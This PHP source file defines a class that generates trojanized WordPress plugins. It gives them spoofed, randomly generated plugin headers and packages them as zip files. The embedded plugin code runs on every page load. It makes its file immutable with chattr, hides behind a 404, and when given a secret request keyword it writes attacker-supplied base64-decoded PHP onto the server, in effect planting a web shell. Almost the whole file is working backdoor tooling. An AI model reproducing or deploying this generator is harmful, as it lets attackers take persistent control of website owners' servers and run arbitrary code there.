<?php

namespace new_bots\wordpressPlugins;

use Faker\Factory;


class makeMeWordPressing extends \ZipArchive
{

    private \Faker\Generator $faker;
    private string $activator;
    private string $spoof_directory_name;

    function __construct(string | null $activator)
    {
        $this->faker = Factory::create();
        $this->random_name = bin2hex(openssl_random_pseudo_bytes(24));
        if (!is_null($activator)){
            $this->activator = $activator;
        } else {
            echo "Due to the fact that you did not give me an activation keyword.".PHP_EOL."I will be setting the activation keyword to \033[0;31mCHANGEME\033[0m".PHP_EOL;
            $this->activator = 'CHANGEME';
        }
        $this->spoof_directory_name = $this->faker->word();
        if (is_dir($this->spoof_directory_name)){
            rmdir($this->spoof_directory_name);
        }
        mkdir($this->spoof_directory_name);
    }

    protected function spoofWordPressHeader(): array
    {
        return [
            "Plugin Name:" => $this->faker->word(),
            "Plugin URI:" => $this->faker->url(),
            "Description:" => $this->faker->sentence(8),
            "Version:" => rand(0, 10) . '.' . rand(0, 50) . '.' . rand(1, 15),
            "Requires At Least:" => floatval(4.1),
            "Requires PHP:" => 7.2,
            "Author:" => $this->faker->firstName . " " . $this->faker->lastName,
            "Author URI:" => $this->faker->url(),
            "License:" => "GPL v2 or later",
            "License URI:" => "https://www.gnu.org/licenses/gpl-2.0.html",
            "Update URI:" => $this->faker->url()
        ];
    }

    public function createTrojanWordpress(): array
    {
        $spoof = $this->spoofWordPressHeader();
        $base = "<?php\n/*\n";
        foreach ($spoof as $key => $valu){
            $base .= "* {$key} {$valu}\n";
        }
        $base .= "*/\n\n";
        $template = <<<TPL
$base
function {$spoof['Plugin Name:']}(){
    @system("chattr +i ".\$_SERVER['SCRIPT_FILENAME']) || @system("chattr +i ". __FILE__);
    if (!is_file('$this->random_name.php')){
        if (isset(\$_REQUEST['{$this->activator}'])){
            file_put_contents('{$this->random_name}.php', base64_decode(\$_REQUEST['$this->activator']));
            header("FileName: {$this->random_name}.php");
            die();
        } else {
            http_response_code(404);
            die();
        }    }else{
        die();
    }
}
add_action('init', {$spoof['Plugin Name:']});
TPL;
        $tr_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
        file_put_contents("{$this->spoof_directory_name}/{$this->random_name}.php", $template);
        $zipper = new \ZipArchive();
        if ($zipper->open("lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof['Plugin Name:']}.zip", \ZipArchive::CREATE) !== true){
            throw new \Exception(PHP_EOL."\033[0;31m[ !! ] PANIC, I CANNOT WRITE THE ZIP ARCHIVE. [ !! ]\033[0m".PHP_EOL);
        }
        $zipper->addFile("{$this->spoof_directory_name}/{$this->random_name}.php");
        $zipper->close();
        unlink($tr_name);
        rmdir($this->spoof_directory_name);
        return [
            "TrojanPlugin" => "lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof['Plugin Name:']}.zip"
        ];
    }
}